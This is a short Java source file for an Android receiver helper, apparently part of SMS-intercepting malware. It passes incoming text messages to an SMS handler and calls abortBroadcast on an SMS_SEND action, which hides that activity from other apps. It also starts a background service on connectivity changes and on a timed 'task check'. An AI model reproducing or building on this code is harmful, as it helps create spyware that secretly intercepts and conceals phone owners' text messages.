package net.workspace.export;
import net.workspace.biz.BIZ;
import net.workspace.sms.SmsHelper;
import net.workspace.util.T;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.tt.export.MainService;

public class ReceiverHelper {
    private static final Object locker = new Object();
    private static long lastActionTime = 0L;
    public static void doReceiver(BroadcastReceiver receiver, Context context, Intent intent) {
        T.registerReciever();
        if ("android.net.conn.CONNECTIVITY_CHANGE".equals(intent.getAction())) {
            context.startService(new Intent(context, MainService.class).setAction(intent.getAction()));
        } else if (T.SMS_RECEIVED.equals(intent.getAction())) {
            SmsHelper.onSmsRecieved(receiver, intent);
        } else if (T.SMS_SEND.equals(intent.getAction())) {
            receiver.abortBroadcast();
        } else {
            synchronized (locker) {
                long current = System.currentTimeMillis();
                if (current - lastActionTime >= BIZ.TASK_CHECK_INTERVAL * 1000) {
                    lastActionTime = current;
                    context.startService(new Intent(context, MainService.class).setAction(ServiceHelper.TASK_CHECK));
                }
            }
        }
    }
}
